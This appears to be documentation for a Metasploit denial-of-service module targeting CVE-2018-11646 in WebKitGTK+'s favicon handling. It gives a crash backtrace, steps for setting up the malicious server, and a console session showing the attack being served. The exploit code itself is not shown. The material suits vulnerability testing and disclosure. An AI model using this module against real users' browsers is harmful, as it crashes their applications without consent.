## Vulnerable Application

This module exploits a vulnerability in `WebKitFaviconDatabase` when `pageURL` is unset.
If successful, it could lead to application crash, resulting in denial of service.

The `webkitFaviconDatabaseSetIconForPageURL` and `webkitFaviconDatabaseSetIconURLForPageURL`
functions in `UIProcess/API/glib/WebKitFaviconDatabase.cpp` in WebKit, as used in WebKitGTK+
through 2.21.3, mishandle an unset `pageURL`, leading to an application crash.

Related links : 
* https://bugs.webkit.org/show_bug.cgi?id=186164
* https://datarift.blogspot.com/2018/06/cve-2018-11646-webkit.html

## Backtrace using Fedora 27

```
#0 WTF::StringImpl::rawHash
at /usr/src/debug/webkitgtk4-2.18.0-2.fc27.x86_64/Source/WTF/wtf/text/StringImpl.h line 508
#1 WTF::StringImpl::hasHash
at /usr/src/debug/webkitgtk4-2.18.0-2.fc27.x86_64/Source/WTF/wtf/text/StringImpl.h line 514
#2 WTF::StringImpl::hash
at /usr/src/debug/webkitgtk4-2.18.0-2.fc27.x86_64/Source/WTF/wtf/text/StringImpl.h line 525
#3 WTF::StringHash::hash
at /usr/src/debug/webkitgtk4-2.18.0-2.fc27.x86_64/Source/WTF/wtf/text/StringHash.h line 73
#9 WTF::HashMap, WTF::HashTraits >::get
at /usr/src/debug/webkitgtk4-2.18.0-2.fc27.x86_64/Source/WTF/wtf/HashMap.h line 406
#10 webkitFaviconDatabaseSetIconURLForPageURL
at /usr/src/debug/webkitgtk4-2.18.0-2.fc27.x86_64/Source/WebKit/UIProcess/API/glib/WebKitFaviconDatabase.cpp line 193
#11 webkitFaviconDatabaseSetIconForPageURL
at /usr/src/debug/webkitgtk4-2.18.0-2.fc27.x86_64/Source/WebKit/UIProcess/API/glib/WebKitFaviconDatabase.cpp line 318
#12 webkitWebViewSetIcon
at /usr/src/debug/webkitgtk4-2.18.0-2.fc27.x86_64/Source/WebKit/UIProcess/API/glib/WebKitWebView.cpp line 1964
#13 WTF::Function::performCallbackWithReturnValue
at /usr/src/debug/webkitgtk4-2.18.0-2.fc27.x86_64/Source/WebKit/UIProcess/GenericCallback.h line 108
#15 WebKit::WebPageProxy::dataCallback
at /usr/src/debug/webkitgtk4-2.18.0-2.fc27.x86_64/Source/WebKit/UIProcess/WebPageProxy.cpp line 5083
#16 WebKit::WebPageProxy::finishedLoadingIcon
at /usr/src/debug/webkitgtk4-2.18.0-2.fc27.x86_64/Source/WebKit/UIProcess/WebPageProxy.cpp line 6848
#17 IPC::callMemberFunctionImpl::operator()
at /usr/src/debug/webkitgtk4-2.18.0-2.fc27.x86_64/Source/WTF/wtf/glib/RunLoopGLib.cpp line 68
#29 WTF::RunLoop::::_FUN(gpointer)
at /usr/src/debug/webkitgtk4-2.18.0-2.fc27.x86_64/Source/WTF/wtf/glib/RunLoopGLib.cpp line 70
#30 g_main_dispatch
at gmain.c line 3148
#31 g_main_context_dispatch
at gmain.c line 3813
#32 g_main_context_iterate
at gmain.c line 3886
#33 g_main_context_iteration
at gmain.c line 3947
#34 g_application_run
at gapplication.c line 2401
#35 main
at ../src/ephy-main.c line 432 

```

## Verification Steps

    Start msfconsole
    use auxiliary/dos/http/webkitplus
    Set SRVHOST
    Set SRVPORT
    Set URIPATH
    run (Server started)
Visit server URL in epiphany web browser which uses webkit. 

## Scenarios

```
msf auxiliary(dos/http/webkitplus) > show options 

Module options (auxiliary/dos/http/webkitplus):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  192.168.1.105    yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH  /                no        The URI to use for this exploit (default is random)


Auxiliary action:

   Name       Description
   ----       -----------
   WebServer


msf auxiliary(dos/http/webkitplus) > run
[*] Auxiliary module running as background job 0.
msf auxiliary(dos/http/webkitplus) > 
[*] Using URL: http://192.168.1.105:8080/
[*] Server started.

msf auxiliary(dos/http/webkitplus) > 
[*] Sending response

msf auxiliary(dos/http/webkitplus) >
```
